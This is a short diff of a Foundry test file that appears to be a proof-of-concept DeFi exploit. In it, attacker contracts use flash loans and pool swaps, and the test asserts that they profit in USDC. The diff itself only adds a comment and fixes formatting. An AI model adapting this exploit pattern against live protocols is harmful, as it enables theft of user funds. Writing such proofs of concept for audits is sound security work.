@@ -183,6 +183,7 @@ contract BaseTest is Test {
         attackerOne._repayFlashLoan(100e18);
         // Now we swap the Liquidated LSTs via the stLink/Link and USDC/Link pools into USDC
         // to make sure we have enough money  to pay back the loan at the end.
+        // Note that at this point, we already set the Link/stLink pool back into it's original state, by letting flashloan 1 revert.
         vm.startPrank(address(attackerTwo));
         lst.approve(address(poolLinkStlink), type(uint256).max);
         token.approve(address(poolLinkUSDC), type(uint256).max);
@@ -196,7 +197,6 @@ contract BaseTest is Test {
         vm.warp(2);
         // Final Check, the thing which matters: Did we make USDC?
         assert(endingBalance > startingBalance);
-        console.log("Attackers Ending USDC balance: ", endingBalance / 1e18); 
-    }
-
+        console.log("Attackers Ending USDC balance: ", endingBalance / 1e18);
+    }    
 }
